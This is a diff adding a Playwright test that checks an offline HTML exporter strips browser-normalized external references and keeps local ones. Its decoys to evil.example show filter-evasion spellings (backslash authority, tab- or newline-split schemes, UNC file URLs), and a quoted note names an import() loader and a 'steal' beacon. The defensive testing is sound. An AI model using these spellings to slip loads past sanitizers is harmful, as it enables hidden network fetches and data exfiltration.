@@ -2327,6 +2327,104 @@ test("CMH-OFFLINE-04: an SVG script that loads through href or xlink:href is str
   }
 });
 
+// A browser NORMALIZES a reference before it fetches: it removes ASCII tab/CR/LF from anywhere in
+// the value, strips leading and trailing C0-or-space, and - for a special scheme - treats a
+// backslash exactly like a slash. Both the strip and the validator used to test the raw literal, so
+// `https:/\evil.example/x.js` (verified fetching https://evil.example/x.js in a real Chromium),
+// `ht<tab>tps://...` and `file://host/...` (an SMB UNC fetch on Windows) rode into an offline file
+// with only the CSP between them and the network (#923).
+const NORMALIZED_URL_CONTENT = [
+  "<h1>Browser-normalized references</h1>",
+  '<p id="normalized-note">The URL parser cleans a value up before it fetches it.</p>',
+  // Live-DOM decoys: every one of these resolves to https://evil.example, which the test's route
+  // aborts, so nothing is actually fetched while the strip is exercised end to end.
+  '<img id="cmh-img-backslash" src="https:/\\evil.example/img-backslash.png" alt="backslash authority">',
+  '<img id="cmh-img-scheme-relative-backslash" src="\\\\evil.example/img-scheme-backslash.png" alt="backslash authority">',
+  '<img id="cmh-img-tab" src="ht\ttps://evil.example/img-tab.png" alt="tab-split scheme">',
+  // The srcset candidate boundary is HTML's, not the engine's: U+000B is engine whitespace but not
+  // ASCII whitespace, so a candidate cut there hid the load from both implementations. Written as
+  // character references so the spec file stays plain ASCII; the parser decodes them.
+  '<img id="cmh-img-srcset" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" srcset="&#1;&#11;//evil.example/img-srcset.png 1x" alt="srcset">',
+  '<iframe id="cmh-iframe-newline" src="https:\n//evil.example/frame-newline.html" title="newline-split"></iframe>',
+  '<link rel="stylesheet" href="\\\\evil.example/style-backslash.css">',
+  '<svg width="10" height="10" aria-hidden="true">',
+  '  <script href="https:\\\\evil.example/svg-backslash.js">/* cmh-svg-backslash-decoy */</script>',
+  "</svg>",
+  // The `file:` decoys are template-parked on purpose: an authority-bearing `file:` URL is an SMB
+  // fetch on Windows, and the point is what the strip and the gate DO with it, not to make the
+  // source document attempt one. Template content is inert, and both implementations walk it.
+  '<template><img id="cmh-img-unc" src="file://evil.example/img-unc.png" alt="unc">'
+  + '<img id="cmh-img-unc4" src="file:////evil.example/img-unc4.png" alt="four-slash unc">'
+  + '<svg><script href="file:\\\\evil.example/svg-unc.js">/* cmh-svg-unc-decoy */</script></svg></template>',
+  // Controls: a backslash inside an ordinary relative path leaves it relative, and a `file:` URL
+  // whose authority is empty or a Windows DRIVE LETTER stays on the machine, so none may be
+  // touched. (The controls are SVG scripts rather than `<img>`s only because ANY local image path
+  // draws the separate "inline_images" warning, which `--strict` treats as blocking.)
+  '<svg width="10" height="10" aria-hidden="true">',
+  '  <script href="sub\\svg-local-keep.js">/* cmh-svg-relative-keep */</script>',
+  '  <script href="file:///local/svg-file-keep.js">/* cmh-svg-file-keep */</script>',
+  '  <script href="file://C:/local/svg-drive-keep.js">/* cmh-svg-drive-keep */</script>',
+  "</svg>",
+].join("\n");
+
+test("CMH-OFFLINE-04: the offline strip reads a reference the way the URL parser does", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(NORMALIZED_URL_CONTENT, { key: "cmh-offline-normalized-url", source: "offline-normalized-url.html" });
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    for (const target of ["evil.example/img-backslash.png", "evil.example/img-scheme-backslash.png",
+      "evil.example/img-tab.png", "evil.example/img-srcset.png", "evil.example/frame-newline.html",
+      "evil.example/style-backslash.css", "evil.example/svg-backslash.js",
+      "evil.example/img-unc.png", "evil.example/img-unc4.png", "evil.example/svg-unc.js"]) {
+      expect(exportedHtml, `${target} is a network load a browser would make and must not survive`)
+        .not.toContain(target);
+    }
+    // The controls must survive INTACT: over-detecting here would silently delete an author's
+    // local reference, which is the same content loss in the other direction.
+    expect(exportedHtml, "a backslash-separated relative path is not a network load").toContain('href="sub\\svg-local-keep.js"');
+    expect(exportedHtml, "a backslash-separated relative script reference is not a network load").toContain("cmh-svg-relative-keep");
+    expect(exportedHtml, "an empty-host file: URL stays on the machine").toContain('href="file:///local/svg-file-keep.js"');
+    expect(exportedHtml, "a Windows drive letter in the host position is a local path").toContain('href="file://C:/local/svg-drive-keep.js"');
+    // A deliberately COARSE raw-literal scan, not the production predicate: it recognizes only
+    // `(?:https?:)?//`, so it cannot see the spellings this test is about. The explicit
+    // not-toContain loop above is what covers those; this is the belt-and-braces sweep for the
+    // ordinary ones.
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+
+    const exportedPath = path.join(outDir, "offline-normalized-url.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
 const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
   + 'location.href = "https://evil.example/steal" beacon before we ship this.';
 
